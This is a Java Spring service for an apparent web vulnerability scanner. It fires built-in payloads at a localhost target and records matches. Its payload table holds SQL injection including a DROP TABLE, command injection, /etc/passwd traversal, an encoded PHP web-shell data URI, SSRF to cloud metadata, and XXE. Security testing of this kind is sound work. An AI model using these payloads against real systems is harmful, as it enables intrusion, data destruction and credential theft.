package com.network.monitor.service.impl;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.network.monitor.dto.InputParamDTO;
import com.network.monitor.entity.ScanInterfaceEntity;
import com.network.monitor.service.UniversalScanExecutor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.*;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;

import java.util.*;

/**
 * 通用扫描执行器实现
 */
@Slf4j
@Service
public class UniversalScanExecutorImpl implements UniversalScanExecutor {

    private final ObjectMapper objectMapper = new ObjectMapper();

    @Autowired
    private RestTemplate restTemplate;

    private static final String TARGET_BASE_URL = "http://localhost:9001";

    private static final Map<String, List<PayloadDefinition>> VULN_PAYLOADS = new LinkedHashMap<>();

    static {
        VULN_PAYLOADS.put("SQL_INJECTION", Arrays.asList(
                new PayloadDefinition("id", "1' OR '1'='1", "sql syntax|error|exception"),
                new PayloadDefinition("id", "1; DROP TABLE users--", "sql syntax|error|exception"),
                new PayloadDefinition("id", "1 UNION SELECT NULL--", "sql syntax|error|exception"),
                new PayloadDefinition("id", "1' AND 1=1--", "sql syntax|error|exception")
        ));

        VULN_PAYLOADS.put("XSS", Arrays.asList(
                new PayloadDefinition("input", "<script>alert('XSS')</script>", "<script>alert|XSS"),
                new PayloadDefinition("input", "<img src=x onerror=alert('XSS')>", "onerror=alert|XSS"),
                new PayloadDefinition("input", "javascript:alert('XSS')", "javascript:alert|XSS"),
                new PayloadDefinition("input", "<svg onload=alert('XSS')>", "onload=alert|XSS")
        ));

        VULN_PAYLOADS.put("COMMAND_INJECTION", Arrays.asList(
                new PayloadDefinition("cmd", "; ls -la", "total|drwx|rw-"),
                new PayloadDefinition("cmd", "| whoami", "root|admin|user"),
                new PayloadDefinition("cmd", "& dir", "Volume|Directory|bytes"),
                new PayloadDefinition("cmd", "` id`", "uid=|gid=|groups=")
        ));

        VULN_PAYLOADS.put("PATH_TRAVERSAL", Arrays.asList(
                new PayloadDefinition("filename", "../../../etc/passwd", "root:|/bin/bash|/bin/sh"),
                new PayloadDefinition("filename", "....//....//....//etc/passwd", "root:|/bin/bash"),
                new PayloadDefinition("filename", "..%2F..%2F..%2Fetc/passwd", "root:|/bin/bash"),
                new PayloadDefinition("filename", "/etc/passwd", "root:|/bin/bash")
        ));

        VULN_PAYLOADS.put("FILE_INCLUSION", Arrays.asList(
                new PayloadDefinition("path", "php://filter/convert.base64-encode/resource=index.php", "PD9w|base64"),
                new PayloadDefinition("path", "file:///etc/passwd", "root:|/bin/bash"),
                new PayloadDefinition("path", "expect://id", "uid=|gid="),
                new PayloadDefinition("path", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+", "system")
        ));

        VULN_PAYLOADS.put("SSRF", Arrays.asList(
                new PayloadDefinition("url", "http://127.0.0.1:22", "SSH|OpenSSH"),
                new PayloadDefinition("url", "http://localhost:9001/actuator/health", "status|UP"),
                new PayloadDefinition("url", "file:///etc/passwd", "root:|/bin/bash"),
                new PayloadDefinition("url", "http://169.254.169.254/latest/meta-data/", "ami-id|instance-id")
        ));

        VULN_PAYLOADS.put("XXE", Arrays.asList(
                new PayloadDefinition("xmlBody", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", "root:|/bin/bash"),
                new PayloadDefinition("xmlBody", "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:9001/\">]><foo>&xxe;</foo>", "status|UP")
        ));

        VULN_PAYLOADS.put("CSRF", Arrays.asList(
                new PayloadDefinition("_csrf", "", "success|updated|changed")
        ));

        VULN_PAYLOADS.put("DESERIALIZATION", Arrays.asList(
                new PayloadDefinition("data", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAADAAN3cIAAAAQAAAAAB4", "error|exception")
        ));

        VULN_PAYLOADS.put("FILE_UPLOAD", Arrays.asList(
                new PayloadDefinition("file", "test.jsp", "uploaded|success"),
                new PayloadDefinition("file", "test.php", "uploaded|success"),
                new PayloadDefinition("file", "test.html", "uploaded|success")
        ));
    }

    @Override
    public Map<String, Object> executeScan(ScanInterfaceEntity entity) {
        List<String> vulnTypes = parseInferredVulnTypes(entity.getInferredVulnTypes());
        if (vulnTypes.isEmpty()) {
            vulnTypes = Collections.singletonList(entity.getVulnType());
        }
        return executeScan(entity, vulnTypes);
    }

    @Override
    public Map<String, Object> executeScan(ScanInterfaceEntity entity, List<String> inferredVulnTypes) {
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("interfaceId", entity.getId());
        result.put("interfacePath", entity.getInterfacePath());
        result.put("interfaceName", entity.getInterfaceName());

        List<Map<String, Object>> findings = new ArrayList<>();
        result.put("findings", findings);

        if (inferredVulnTypes == null || inferredVulnTypes.isEmpty()) {
            result.put("status", "SKIPPED");
            result.put("message", "未指定漏洞类型");
            return result;
        }

        List<InputParamDTO> params = parseInputParams(entity.getInputParams());

        for (String vulnType : inferredVulnTypes) {
            List<PayloadDefinition> payloads = VULN_PAYLOADS.get(vulnType);
            if (payloads == null) {
                log.warn("不支持的漏洞类型：{}", vulnType);
                continue;
            }

            for (PayloadDefinition payload : payloads) {
                try {
                    Map<String, Object> finding = executePayload(entity, params, payload, vulnType);
                    if (finding != null) {
                        findings.add(finding);
                    }
                } catch (Exception e) {
                    log.warn("执行payload失败：vulnType={}, payload={}, error={}",
                            vulnType, payload.payload, e.getMessage());
                }
            }
        }

        result.put("status", findings.isEmpty() ? "CLEAN" : "VULNERABLE");
        result.put("vulnCount", findings.size());
        return result;
    }

    @Override
    public List<String> getSupportedVulnTypes() {
        return new ArrayList<>(VULN_PAYLOADS.keySet());
    }

    private Map<String, Object> executePayload(ScanInterfaceEntity entity, List<InputParamDTO> params,
                                                PayloadDefinition payload, String vulnType) {
        String url = TARGET_BASE_URL + entity.getInterfacePath();
        String method = entity.getHttpMethod() != null ? entity.getHttpMethod() : "GET";

        try {
            ResponseEntity<String> response;
            HttpHeaders headers = new HttpHeaders();

            if ("POST".equalsIgnoreCase(method)) {
                headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
                Map<String, String> formParams = buildFormParams(params, payload);
                String body = buildFormBody(formParams);
                response = restTemplate.exchange(url, HttpMethod.POST,
                        new HttpEntity<>(body, headers), String.class);
            } else {
                String queryString = buildQueryString(params, payload);
                String fullUrl = url + (queryString.isEmpty() ? "" : "?" + queryString);
                response = restTemplate.exchange(fullUrl, HttpMethod.GET,
                        new HttpEntity<>(headers), String.class);
            }

            String responseBody = response.getBody();
            if (responseBody != null && containsMatch(responseBody, payload.matchPattern)) {
                Map<String, Object> finding = new LinkedHashMap<>();
                finding.put("vulnType", vulnType);
                finding.put("payload", payload.payload);
                finding.put("paramName", payload.paramName);
                finding.put("matchedPattern", payload.matchPattern);
                finding.put("responseSnippet", truncate(responseBody, 500));
                finding.put("riskLevel", getRiskLevel(vulnType));
                return finding;
            }
        } catch (Exception e) {
            if (isBlockedByDefense(e.getMessage())) {
                Map<String, Object> finding = new LinkedHashMap<>();
                finding.put("vulnType", vulnType);
                finding.put("status", "BLOCKED");
                finding.put("message", "请求被防御规则拦截");
                finding.put("payload", payload.payload);
                return finding;
            }
        }

        return null;
    }

    private Map<String, String> buildFormParams(List<InputParamDTO> params, PayloadDefinition payload) {
        Map<String, String> formParams = new LinkedHashMap<>();
        if (params != null) {
            for (InputParamDTO param : params) {
                if (param.getName().equalsIgnoreCase(payload.paramName)) {
                    formParams.put(param.getName(), payload.payload);
                } else {
                    formParams.put(param.getName(), getDefaultValue(param));
                }
            }
        }
        if (!formParams.containsKey(payload.paramName)) {
            formParams.put(payload.paramName, payload.payload);
        }
        return formParams;
    }

    private String buildFormBody(Map<String, String> params) {
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> entry : params.entrySet()) {
            if (sb.length() > 0) {
                sb.append("&");
            }
            sb.append(entry.getKey()).append("=").append(entry.getValue());
        }
        return sb.toString();
    }

    private String buildQueryString(List<InputParamDTO> params, PayloadDefinition payload) {
        StringBuilder sb = new StringBuilder();
        if (params != null) {
            for (InputParamDTO param : params) {
                if (sb.length() > 0) {
                    sb.append("&");
                }
                String value = param.getName().equalsIgnoreCase(payload.paramName)
                        ? payload.payload : getDefaultValue(param);
                sb.append(param.getName()).append("=").append(value);
            }
        }
        if (!containsParam(params, payload.paramName)) {
            if (sb.length() > 0) {
                sb.append("&");
            }
            sb.append(payload.paramName).append("=").append(payload.payload);
        }
        return sb.toString();
    }

    private boolean containsParam(List<InputParamDTO> params, String paramName) {
        if (params == null) return false;
        return params.stream().anyMatch(p -> p.getName().equalsIgnoreCase(paramName));
    }

    private String getDefaultValue(InputParamDTO param) {
        if (param.getDefaultValue() != null) {
            return param.getDefaultValue();
        }
        return switch (param.getType().toLowerCase()) {
            case "string" -> "test";
            case "int", "integer", "number" -> "1";
            case "boolean" -> "true";
            default -> "test";
        };
    }

    private boolean containsMatch(String response, String pattern) {
        if (pattern == null || response == null) return false;
        String lowerResponse = response.toLowerCase();
        for (String p : pattern.split("\\|")) {
            if (lowerResponse.contains(p.toLowerCase())) {
                return true;
            }
        }
        return false;
    }

    private boolean isBlockedByDefense(String message) {
        if (message == null) return false;
        return message.contains("403") || message.contains("Forbidden") ||
                message.contains("blocked") || message.contains("WAF");
    }

    private String getRiskLevel(String vulnType) {
        return switch (vulnType) {
            case "COMMAND_INJECTION", "SQL_INJECTION", "XXE", "DESERIALIZATION" -> "CRITICAL";
            case "SSRF", "PATH_TRAVERSAL", "FILE_INCLUSION" -> "HIGH";
            case "XSS", "CSRF" -> "MEDIUM";
            case "FILE_UPLOAD" -> "MEDIUM";
            default -> "LOW";
        };
    }

    private String truncate(String str, int maxLength) {
        if (str == null) return null;
        return str.length() > maxLength ? str.substring(0, maxLength) + "..." : str;
    }

    private List<String> parseInferredVulnTypes(String json) {
        if (json == null || json.isEmpty()) {
            return new ArrayList<>();
        }
        try {
            return objectMapper.readValue(json, new TypeReference<List<String>>() {});
        } catch (JsonProcessingException e) {
            log.warn("解析推断漏洞类型失败：{}", e.getMessage());
            return new ArrayList<>();
        }
    }

    private List<InputParamDTO> parseInputParams(String json) {
        if (json == null || json.isEmpty()) {
            return new ArrayList<>();
        }
        try {
            return objectMapper.readValue(json, new TypeReference<List<InputParamDTO>>() {});
        } catch (JsonProcessingException e) {
            log.warn("解析输入参数失败：{}", e.getMessage());
            return new ArrayList<>();
        }
    }

    private record PayloadDefinition(String paramName, String payload, String matchPattern) {}
}
